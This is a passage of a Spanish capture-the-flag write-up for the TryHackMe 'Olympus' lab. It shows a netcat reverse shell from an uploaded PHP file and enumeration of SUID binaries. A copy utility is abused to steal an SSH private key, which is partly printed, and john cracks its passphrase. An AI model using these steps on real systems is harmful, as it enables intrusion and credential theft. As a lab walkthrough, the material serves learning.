</pre></table></code></div></div><p>Abrimos una pestaña nueva en nuestro terminal e iniciamos <strong>netcat</strong></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">nc -lvnp 4321
</span></pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-l</code> : listen mode.<li><code class="language-plaintext highlighter-rouge">-v</code> : verbose.<li><code class="language-plaintext highlighter-rouge">-n</code> : solo IP numéricas, no DNS.<li><code class="language-plaintext highlighter-rouge">-p</code> : nro de puerto local.</ul><p>Cargamos la shell desde el navegador con:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://chat.olympus.thm/uploads/99e7c69732975b95791508afdabc5057.php
</pre></table></code></div></div><p>Confirmamos conexion</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4321
<span class="go">listening on [any] 4321 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 46000
</span><span class="gp">Linux olympus 5.4.0-109-generic #</span>123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
<span class="go"> 16:49:33 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> 
</span></pre></table></code></div></div><p>Bien, estamos dentro. Vamos a estabilizar la shell lo primero</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">$</span><span class="w"> </span>which python2 python3
<span class="go">/usr/bin/python3
</span><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
<span class="gp">www-data@olympus:/$</span><span class="w"> 
</span></pre></table></code></div></div><p>Y empezamos a brujulear …</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">pwd
/
</span><span class="gp">www-data@olympus:/$</span><span class="w"> </span><span class="nb">cd </span>home
<span class="go">cd home
</span><span class="gp">www-data@olympus:/home$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
zeus
</span><span class="gp">www-data@olympus:/home$</span><span class="w"> </span><span class="nb">cd </span>zeus
<span class="go">cd zeus
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
snap  user.flag  zeus.txt
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">cat </span>user.flag
<span class="go">cat user.flag
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">cat </span>zeus.txt
<span class="go">cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



                                                - Prometheus.
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span></pre></table></code></div></div><p>OK, hemos conseguido la segunda flag y un mensaje de <em>Prometheus</em> a su colega <em>Zeus</em> poniendo a caldo al chico de IT y alardeando de disponer de un acceso permanente como super usuario al server.</p><p>Seguimos trasteando un poco a ver qué encontramos.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 48
drwxr-xr-x 7 zeus zeus 4096 Apr 19 08:40 .
drwxr-xr-x 3 root root 4096 Mar 22 15:12 ..
</span><span class="gp">lrwxrwxrwx 1 root root    9 Mar 23 08:58 .bash_history -&gt;</span><span class="w"> </span>/dev/null
<span class="go">-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 .bashrc
drwx------ 2 zeus zeus 4096 Mar 22 15:13 .cache
drwx------ 3 zeus zeus 4096 Apr 14 09:56 .gnupg
drwxrwxr-x 3 zeus zeus 4096 Mar 23 08:33 .local
-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
drwx------ 2 zeus zeus 4096 Apr 14 10:35 .ssh
-rw-r--r-- 1 zeus zeus    0 Mar 22 15:13 .sudo_as_admin_successful
drwx------ 3 zeus zeus 4096 Apr 14 09:56 snap
-rw-rw-r-- 1 zeus zeus   34 Mar 23 08:34 user.flag
-r--r--r-- 1 zeus zeus  199 Apr 15 07:28 zeus.txt
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span><span class="go">
</span></pre></table></code></div></div><p>La teoría nos dice que el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/.ssh</code>  es donde se almacenan, de existir, las claves pública <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">id_rsa.pub</code>  y privada <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">id_rsa</code> necesarias para acceder por ssh (recordemos que el puerto 22/tcp aparecía abierto).</p><p>El problema ? … el directorio pertenece a <em>zeus</em> y no tenemos acceso con nuestro usuario actual <em>www-data</em>. Toca escalar privilegios.</p><h2 id="escalado-de-privilegios"><span class="mr-2">Escalado de privilegios</span><a href="#escalado-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Tiramos por los clásicos y buscamos enumerar binarios con el bit SUID activado.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
<span class="gp">&lt; find / -perm -4000 -exec ls -ldb {} \;</span><span class="w"> </span>2&gt;/dev/null
<span class="go">-rwsr-xr-x 1 root root 142696 Feb 23 18:25 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Dec  2  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 22840 Feb 21 12:58 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 zeus zeus 17728 Apr 18 09:27 /usr/bin/cputils
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /usr/bin/mount
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 31032 Feb 21 12:58 /usr/bin/pkexec
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /usr/bin/su
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /usr/bin/umount
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 123560 Apr  8 19:36 /snap/snapd/15534/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 123560 Jun 15 13:41 /snap/snapd/16292/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /snap/core20/1434/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /snap/core20/1434/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /snap/core20/1434/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /snap/core20/1434/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /snap/core20/1434/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /snap/core20/1434/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /snap/core20/1434/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1434/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /snap/core20/1434/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 /snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Dec  2  2021 /snap/core20/1434/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 85064 Mar 14 08:26 /snap/core20/1518/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Mar 14 08:26 /snap/core20/1518/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Mar 14 08:26 /snap/core20/1518/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /snap/core20/1518/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Mar 14 08:26 /snap/core20/1518/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Mar 14 08:26 /snap/core20/1518/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /snap/core20/1518/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1518/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /snap/core20/1518/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Apr 29 12:03 /snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30 13:03 /snap/core20/1518/usr/lib/openssh/ssh-keysign
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w">
</span></pre></table></code></div></div><p>Entre el listado que obtenemos aparece un tal <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/usr/bin/cputils</code>  que llama mi atención. Por qué ? porque no se lo que es.</p><p>Buscamos en Google. Nada :(</p><p>Intentamos ver su página man</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span>man cputils
<span class="go">man cputils
No manual entry for cputils
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w">
</span></pre></table></code></div></div><p>El nombre da a pensar que se trate de una utilidad para <em>copiar cosas</em>, por lo de <em>cp</em>, pero a saber. Hay que salir de dudas.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span>cputils
<span class="go">cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: zeus.txt
zeus.txt

Enter the Name of Target File: /tmp/copia_zeus.txt
/tmp/copia_zeus.txt

File copied successfully.
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w">
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/copia_zeus.txt
<span class="go">ls -la /tmp/copia_zeus.txt
-rw-rw-rw- 1 zeus www-data 199 Aug  6 19:17 /tmp/copia_zeus.txt
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span></pre></table></code></div></div><p>Qué hemos hecho ?</p><ul><li><p>Copiar un fichero desde nuestra ubicación al directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/tmp</code> .</p><li><p>Comprobar que se ha copiado.</p></ul><p>Qué hemos averiguado ?</p><ul><li><p>Que efectivamente <strong>cputils</strong> es una utilidad que nos permite copiar ficheros entre diferentes ubicaciones, pero no solo eso …</p><li><p>Que al ejecutarla y copiar un fichero de un sitio a otro, el fichero copiado cambia sus permisos y el grupo al que pertenece.</p></ul><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">#</span><span class="w"> </span>el fichero en su ubicación original
<span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">[...]
-r--r--r-- 1 zeus zeus  199 Apr 15 07:28 zeus.txt
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span><span class="go">
</span><span class="gp">#</span><span class="w"> </span>el fichero copiado a /tmp
<span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/copia_zeus.txt
<span class="go">[...]
-rw-rw-rw- 1 zeus www-data 199 Aug  6 19:17 /tmp/copia_zeus.txt
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span></pre></table></code></div></div><p>Y si utilizamos esto para copiar la clave privada ssh ?</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span>cputils
<span class="go">cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: .ssh/id_rsa
.ssh/id_rsa

Enter the Name of Target File: /tmp/zeus_id_rsa
/tmp/zeus_id_rsa

File copied successfully.
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/zeus_id_rsa
<span class="go">ls -la /tmp/zeus_id_rsa
-rw-rw-rw- 1 zeus www-data 2655 Aug  6 19:49 /tmp/zeus_id_rsa
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> </span><span class="nb">cat</span> /tmp/zeus_id_rsa
<span class="go">cat /tmp/zeus_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
[...]
-----END OPENSSH PRIVATE KEY-----
</span><span class="gp">www-data@olympus:/home/zeus$</span><span class="w"> 
</span></pre></table></code></div></div><p>OK. Copiamos la clave desde el terminal a un fichero en local y lo guardamos en nuestro directorio de trabajo como <em>zeus_id_rsa</em>. Probamos a conectarnos con el server via ssh utilizando esta clave.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>ssh <span class="nt">-i</span> zeus_id_rsa zeus@10.10.129.191
<span class="go">[sudo] password for ewan67: 
The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.
Enter passphrase for key 'zeus_id_rsa': 
</span></pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-i</code> : identity_file.</ul><p>Mal rollo, la clave tiene una passphrase que desconocemos.</p><p>Tiramos de <strong>ssh2john</strong> (para transformar la clave al formato de John The Reaper) y del propio <strong>john</strong> para crakearla.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>ssh2john zeus_id_rsa <span class="o">&gt;</span> zeus_id_rsa.hash
<span class="go">
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zeus_id_rsa.hash
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxx        (zeus_id_rsa)
1g 0:00:01:27 DONE (2022-08-06 22:12) 0.01145g/s 17.22p/s 17.22c/s 17.22C/s maurice..bunny
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</span></pre></table></code></div></div><p>Con la clave anterior volvemos a intentar la conexion ssh.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>ssh <span class="nt">-i</span> zeus_id_rsa zeus@10.10.129.191
<span class="go">[sudo] password for ewan67: 
The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.
Enter passphrase for key 'zeus_id_rsa': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

[...]

Last login: Sat Jul 16 07:52:39 2022
</span><span class="gp">zeus@olympus:~$</span><span class="w"> 
</span></pre></table></code></div></div><p>Ahora viene la parte donde echamos mano de ese fichero que todos guardamos como oro en paño en nuestro ordenador con un listado de comandos “mágicos”. Tras varias pruebas con el mio, doy con esto:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">zeus@olympus:~$</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-group</span> zeus 2&gt;/dev/null
<span class="go">/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.ssh/authorized_keys
/home/zeus/.ssh/id_rsa
/home/zeus/.ssh/id_rsa.pub
/home/zeus/snap/lxd/common/config/config.yml
/home/zeus/.gnupg/pubring.kbx
/home/zeus/.gnupg/trustdb.gpg
/home/zeus/.bashrc
/home/zeus/.profile
/home/zeus/.cache/motd.legal-displayed
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
/var/crash/_usr_bin_cp-utils.1000.crash
/proc/1165/task/1165/fdinfo/0
/proc/1165/task/1165/fdinfo/1
[...]
</span><span class="gp">zeus@olympus:~$</span><span class="w"> 
</span></pre></table></code></div></div><p>Un listado de los ficheros a los que tiene acceso el grupo <em>zeus</em> en el que hay dos que nos llaman la atención.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
</pre></table></code></div></div><p>Fijaros que estos ficheros no cuelgan de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/olympus.thm/public_html/</code>  sino de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/html/</code>  con lo que deberemos acceder a ellos directamente por IP.</p><p>Cargamos en un navegador la URL:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
</pre></table></code></div></div><p>Nada, ni tirando del código fuente. Probamos con la siguiente</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
</pre></table></code></div></div><p>Nos pinta esto:</p><p><img data-src="/assets/posts/20220804/img09.png" alt="" data-proofer-ignore></p><p>Echamos un veo al código fuente</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;form name="auth" method="POST"&gt;Password: &lt;input type="password" name="password" /&gt;&lt;/form&gt;
</pre></table></code></div></div><p>Lo espartano del código HTML nos da dos pistas:</p><ul><li><p>El propio fichero es el target del formulario dado que no hay atributo <em>action</em> establecido.</p><li><p>Se envía directamente, sin ninguna función js que controle el contenido del input <em>“password”</em>, con lo que es probable que esa validación la haga el propio fichero en el lado servidor.</p></ul><p>Si el propio fichero <em>VIGQFQFMYOST.php</em> es el encargado de gestionar la request POST, nos interesa conocer su contenido.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="gp">zeus@olympus:~$</span><span class="w"> </span><span class="nb">cd</span> /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
<span class="gp">zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 12
drwxrwx--x 2 root     zeus     4096 Jul 15 20:55 .
drwxr-xr-x 3 www-data www-data 4096 May  1 09:01 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14 09:54 index.html
-rwxr-xr-x 1 root     zeus     1589 Jul 15 20:55 VIGQFQFMYOST.php
</span><span class="gp">zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$</span><span class="w"> </span><span class="nb">cat </span>VIGQFQFMYOST.php 
<span class="go">&lt;?php
</span><span class="gp">$</span>pass <span class="o">=</span> <span class="s2">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="p">;</span>
<span class="gp">if(!isset($</span>_POST[<span class="s2">"password"</span><span class="o">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">"password"</span><span class="o">]</span> <span class="o">!=</span> <span class="nv">$pass</span><span class="o">)</span> die<span class="o">(</span><span class="s1">'&lt;form name="auth" method="POST"&gt;Password: &lt;input type="password" name="password" /&gt;&lt;/form&gt;'</span><span class="o">)</span><span class="p">;</span>
<span class="go">
